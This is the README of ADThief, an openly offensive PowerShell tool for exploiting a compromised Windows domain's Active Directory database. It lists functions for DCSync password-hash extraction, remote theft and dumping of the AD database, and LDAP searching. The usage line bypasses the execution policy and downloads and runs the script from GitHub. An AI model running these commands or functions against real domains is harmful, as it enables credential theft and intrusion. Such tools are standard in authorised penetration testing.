# ADThief

ADThief is a PowerShell tool to exploit Active Directory database after compromising a Windows domain.

## Usage

To run on a machine, start PowerShell and then load the module:

```
PS C:\> powershell -EP bypass; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/ADThief/master/ADThief.ps1')
```

## Functions

```
Invoke-DCSync                   -   extracts domain accounts from Active Directory, including password hashes
Get-ADDatabase                  -   steals Active Directory database remotely
Dump-ADDatabase                 -   dumps domain accounts from an offline Active Directory database, including password hashes
Mount-ADDatabase                -   mounts an Active Directory database as a local LDAP server
Invoke-LdapSearch               -   searchs for domain objects in a mounted Active Directory database
```

## Credits

* https://blog.netspi.com/getting-started-wmi-weaponization-part-4/
* https://github.com/MichaelGrafnetter/DSInternals
